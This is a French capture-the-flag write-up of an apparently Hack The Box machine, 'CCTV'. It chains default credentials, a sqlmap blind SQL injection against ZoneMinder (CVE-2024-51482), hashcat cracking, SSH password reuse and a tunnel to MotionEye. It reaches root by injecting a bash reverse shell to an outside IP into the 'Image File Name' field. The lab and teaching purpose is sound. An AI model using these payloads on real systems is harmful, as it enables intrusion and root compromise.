# CCTV - WriteUp Complet
> **OS:** Ubuntu 24.04 | **Difficulté:** Easy | **IP:** 10.129.15.181

---

## Phase 1 - Reconnaissance

### Scan de ports
```bash
nmap -Pn -p- --min-rate 5000 10.129.15.181
nmap -Pn -sCV -p 22,80 10.129.15.181
```

**Résultats :**
| Port | Service | Info |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | Apache 2.4.58, redirect → `http://cctv.htb/` |

**Réflexion :** Seulement 2 ports. Le redirect vers `cctv.htb` indique un virtual host. On ajoute au `/etc/hosts`.

```bash
echo '10.129.15.181 cctv.htb' | sudo tee -a /etc/hosts
```

---

## Phase 2 - Enumération Web

### Page d'accueil
```bash
curl -s http://cctv.htb/
```

Site "SecureVision CCTV & Security Solutions". Un lien **"Staff Login"** pointe vers `/zm`.

### ZoneMinder
```bash
curl -s http://cctv.htb/zm/ | head -20
```

**ZoneMinder** - logiciel open-source de vidéosurveillance. Page de login classique.

### Pourquoi chercher des CVE ?
Le header `X-Powered-By` ou le code source révèle la version. On identifie **ZoneMinder 1.37.63**. En cherchant "ZoneMinder CVE", on trouve **CVE-2024-51482** - Blind SQL Injection dans le paramètre `tid` de l'endpoint `removetag`.

### Test de la vulnérabilité

L'endpoint vulnérable nécessite une authentification. On teste d'abord les credentials par défaut :
- `admin:admin` → **succès !**

```bash
# Capture d'une requête authentifiée dans un fichier
cat > req.txt << 'EOF'
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 HTTP/1.1
Host: cctv.htb
User-Agent: Mozilla/5.0
Cookie: zmSkin=classic; zmCSS=base; ZMSESSID=<votre_session>
Connection: close
EOF

# SQLMap
sqlmap -r req.txt -p tid --batch --technique=T --dbs
sqlmap -r req.txt -p tid --batch --technique=T -D zm --tables
sqlmap -r req.txt -p tid --batch --technique=T --dump -D zm -T Users
```

### Users extraits

| Username | Password (bcrypt) |
|---|---|
| superadmin | `$2y$10$cmytVWFRnt1XfqsItsJRVe/...` |
| mark | `$2y$10$prZGnazejKcuTv5bKNexXO...` |
| admin | `$2y$10$t5z8uIT.n9uCdHCNidcLf....` |

### Crack des hashes
```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Résultats :**
| User | Password |
|---|---|
| mark | **opensesame** |
| superadmin | admin |
| admin | admin |

---

## Phase 3 - Accès SSH (User mark)

### Pourquoi tester mark en SSH ?
Un user applicatif (ZoneMinder) avec un vrai nom (`mark`) a de fortes chances d'être aussi un user système. Password reuse = réflexe.

```bash
ssh mark@cctv.htb
# password: opensesame
```

**Connecté !** Mais `mark` n'a pas de user.txt dans son home. Le flag est dans `/home/sa_mark/` (accès refusé).

### Enumération locale
```bash
id
# uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)

cat /etc/passwd | grep sh$
# mark:x:1000:1000:mark:/home/mark:/bin/bash
# root:x:0:0:root:/root:/bin/bash
# sa_mark:x:1001:1001::/home/sa_mark:/bin/sh

sudo -l
# Sorry, user mark may not run sudo on cctv
```

### Services locaux
```bash
ss -tlnp
```

| Port | Service |
|---|---|
| 3306 | MySQL |
| 7999 | Motion webcontrol |
| 8554 | MediaMTX RTSP |
| 8765 | **MotionEye** |
| 8888 | MediaMTX API |
| 9081 | Motion stream |

### Pourquoi MotionEye est intéressant ?
MotionEye tourne en **root** (nécessaire pour accéder aux caméras). Si on peut y accéder en admin, on peut potentiellement exécuter des commandes en tant que root.

### Config MotionEye
```bash
cat /etc/motioneye/motion.conf
```
```
# @admin_username admin
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

Le password admin est stocké en SHA1. Il n'a pas été cracké avec rockyou, mais **on peut l'utiliser directement** pour se connecter à l'interface web.

---

## Phase 4 - MotionEye → Root

### SSH Tunnel

**Pourquoi un tunnel ?** MotionEye écoute sur `127.0.0.1:8765` - pas accessible depuis l'extérieur. On crée un tunnel SSH pour l'atteindre via notre navigateur.

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

Puis ouvrir `http://localhost:8765` dans le navigateur.

### Login MotionEye

- **Username :** admin
- **Password :** `989c5a8ee87a0e9521ec81a79187d162109282f0` (le hash SHA1 tel quel)

**Pourquoi le hash fonctionne comme password ?** MotionEye compare le SHA1 de l'input avec le hash stocké, OU compare l'input directement avec le hash stocké. Donc entrer le hash lui-même passe la vérification.

### RCE via Client-Side Validation Bypass

**MotionEye 0.43.1b4** a une vulnérabilité : les champs de configuration ne sont pas sanitisés côté serveur. La validation n'existe que côté client (JavaScript). En bypassant cette validation, on peut injecter des commandes shell.

**Étape 1 : Bypass la validation JavaScript**

Ouvrir la console du navigateur (F12 → Console) :
```javascript
configUiValid = function() { return true; };
```

**Pourquoi ça marche ?** La fonction `configUiValid()` vérifie les inputs avant soumission. En la remplaçant par une fonction qui retourne toujours `true`, on court-circuite toute la validation.

**Étape 2 : Configurer le payload**

Dans les settings de la caméra :
1. **Still Images** → **Capture Mode** = `Interval Snapshots`
2. **Snapshot Interval** = `10` secondes
3. **Image File Name** :

```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.17.198/9001 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

4. Cliquer **Apply**

**Pourquoi ça donne un RCE ?** MotionEye écrit ce nom de fichier directement dans le fichier de config Motion (`camera-1.conf`) comme `picture_filename`. Quand Motion exécute et génère un snapshot, il interprète `$(...)` comme une commande shell et l'exécute. Motion tourne sous MotionEye qui tourne en **root**.

**Étape 3 : Listener**
```bash
nc -lvnp 9001
```

Le reverse shell root arrive dans les 10 secondes.

### Flags
```bash
cat /home/sa_mark/user.txt
# 9f9e80807884a26893c1bbf6483f2c16

cat /root/root.txt
# 2ca10afb1e68e0dc6ecd8995ce5e9c18
```

---

## Kill Chain Visuel

```
┌─────────────────────────────────┐
│   Nmap → SSH + HTTP (Apache)    │
│   cctv.htb → ZoneMinder 1.37.63│
└────────────────┬────────────────┘
                 │ admin:admin (default)
┌────────────────▼────────────────┐
│  CVE-2024-51482 Blind SQLi     │
│  sqlmap -r req.txt -p tid      │
│  Dump Users table → bcrypt     │
└────────────────┬────────────────┘
                 │ hashcat → mark:opensesame
┌────────────────▼────────────────┐
│  SSH mark@cctv.htb              │
│  Enum → MotionEye 0.43.1b4     │
│  sur 127.0.0.1:8765 (root)     │
└────────────────┬────────────────┘
                 │ ssh -L 8765:127.0.0.1:8765
┌────────────────▼────────────────┐
│  MotionEye Admin                │
│  Login: admin / SHA1_hash       │
│  Console: configUiValid=true    │
│  Image File Name injection      │
│  $(reverse_shell).%Y-%m-%d...   │
└────────────────┬────────────────┘
                 │ MotionEye runs as ROOT
┌────────────────▼────────────────┐
│  ROOT SHELL                     │
│  user.txt + root.txt            │
└─────────────────────────────────┘
```

---

## Scripts Custom

### exploit_cve2024_51482.py
Script Blind SQLi pour ZoneMinder - voir `/opt/CTF/Machines/CCTV/exploit_cve2024_51482.py`

Utilisation :
```bash
# Test vulnérabilité
python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --test

# Dump users
python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --users

# Découvrir les databases
python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --discover
```

Note : `sqlmap` avec un fichier de requête est plus rapide et fiable pour cette CVE.

---

## Credentials récupérées

| User | Password | Source |
|---|---|---|
| admin (ZM) | admin | Default / Hashcat |
| superadmin (ZM) | admin | Hashcat |
| mark (ZM/SSH) | opensesame | Hashcat bcrypt |
| zmuser (MySQL) | zmpass | ZM API config |
| admin (MotionEye) | SHA1: 989c5a8ee87a0e9521ec81a79187d162109282f0 | Config file |

## Leçons apprises

1. **Credentials par défaut** → `admin:admin` sur ZoneMinder. Toujours tester avant de chercher des exploits.

2. **CVE spécifiques à la version** → ZoneMinder 1.37.63 est vulnérable à CVE-2024-51482 (Blind SQLi). Chercher les advisories GitHub pour la version exacte.

3. **Password reuse** → Le user `mark` de ZoneMinder est aussi un user SSH avec le même password.

4. **SSH tunnel pour services locaux** → Quand un service écoute sur localhost, `ssh -L` est la méthode la plus simple pour y accéder. Pas besoin de scripts API complexes.

5. **Client-side validation bypass** → MotionEye 0.43.1b4 ne valide les inputs que côté client. Un `configUiValid = function() { return true; }` dans la console suffit.

6. **Injection dans les noms de fichiers** → MotionEye écrit les configs Motion directement sans sanitisation. `$(commande)` dans un nom de fichier = RCE.

7. **MotionEye tourne en root** → C'est un choix de design (accès caméras), mais ça donne root directement quand on a le RCE.

## Flags
- **User:** `9f9e80807884a26893c1bbf6483f2c16`
- **Root:** `2ca10afb1e68e0dc6ecd8995ce5e9c18`
